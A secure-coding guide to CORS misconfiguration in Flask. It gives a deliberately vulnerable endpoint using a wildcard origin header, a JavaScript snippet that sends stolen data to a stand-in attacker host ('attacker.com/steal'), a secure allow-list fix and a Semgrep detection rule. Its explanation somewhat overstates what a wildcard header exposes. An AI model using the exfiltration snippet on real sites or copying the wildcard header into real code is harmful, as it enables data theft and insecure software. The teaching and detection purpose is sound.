# Cross-Origin Resource Sharing (CORS) Misconfiguration

### Concept

Cross-Origin Resource Sharing (CORS) is a security mechanism implemented by web browsers to control access to resources from different origins (domains). CORS allows servers to specify which origins are allowed to access their resources. However, if CORS is misconfigured or overly permissive, it can lead to unauthorized access, data leakage, or other security vulnerabilities.

### Vulnerable Scenario

Consider a web application that implements CORS to allow cross-origin resource sharing. The application sets overly permissive CORS headers, allowing any origin to access its resources without proper validation or restrictions.

#### Example Code (Vulnerable)

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/sensitive-data')
def get_sensitive_data():
    response = jsonify({"data": "Sensitive information"})
    response.headers.add('Access-Control-Allow-Origin', '*')
    return response
```

### Explanation

In this example, the `/api/sensitive-data` route returns sensitive information as a JSON response. The `Access-Control-Allow-Origin` header is set to `'*'`, allowing any origin to access the resource.

An attacker can exploit this misconfiguration by creating a malicious web page that sends a request to the vulnerable endpoint from a different origin. For example:

```html
<script>
  fetch('http://example.com/api/sensitive-data')
    .then(response => response.json())
    .then(data => {
      // Send the sensitive data to the attacker's server
      fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

When a user visits the attacker's web page, the malicious script sends a request to the vulnerable endpoint, retrieves the sensitive data, and sends it to the attacker's server. Since the CORS configuration allows any origin, the browser allows the cross-origin request, enabling the attacker to steal the sensitive information.

### Prevention

To prevent CORS misconfigurations and ensure proper security, consider the following measures:

1. Implement a strict whitelist of allowed origins: Instead of using `'*'` or allowing any origin, specify the exact origins that are allowed to access the resources.
2. Validate and verify the origin header: Check the `Origin` header in the request and ensure that it matches the expected and trusted origins.
3. Use the `Access-Control-Allow-Methods` header to restrict the allowed HTTP methods for cross-origin requests.
4. Avoid using wildcard (`*`) values for CORS headers unless absolutely necessary.
5. Implement proper authentication and authorization mechanisms to ensure that only authorized users or origins can access sensitive resources.

#### Example Code (Secure)

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

ALLOWED_ORIGINS = ['https://example.com', 'https://trusted-domain.com']

@app.route('/api/sensitive-data')
def get_sensitive_data():
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response = jsonify({"data": "Sensitive information"})
        response.headers.add('Access-Control-Allow-Origin', origin)
        return response
    else:
        return jsonify({"error": "Unauthorized"}), 403
```

In the secure example, the `ALLOWED_ORIGINS` list defines the trusted origins that are allowed to access the sensitive data. The `Origin` header from the request is checked against the `ALLOWED_ORIGINS` list. If the origin is allowed, the appropriate `Access-Control-Allow-Origin` header is set with the specific origin, ensuring that only trusted origins can access the resource. If the origin is not allowed, an "Unauthorized" error is returned.

By implementing a strict whitelist of allowed origins and validating the `Origin` header, the application prevents unauthorized cross-origin access to sensitive resources.

### Conclusion

Cross-Origin Resource Sharing (CORS) misconfigurations can lead to unauthorized access, data leakage, and other security vulnerabilities. To mitigate these risks, it is crucial to implement a strict whitelist of allowed origins, validate the `Origin` header, restrict the allowed HTTP methods, avoid using wildcard values, and implement proper authentication and authorization mechanisms. Developers should carefully configure CORS settings and follow best practices to ensure the security of their web applications.

#### **Semgrep Rule**

This Semgrep rule can be used as a starting point to potentially identify this type of vulnerability.

```yaml
rules:
  - id: cors-misconfiguration
    patterns:
      - pattern: response.headers.add('Access-Control-Allow-Origin', '*')
    message: "Potential CORS misconfiguration. Avoid using '*' as the allowed origin. Use a strict whitelist of trusted origins."
    languages:
      - python
    severity: WARNING
```
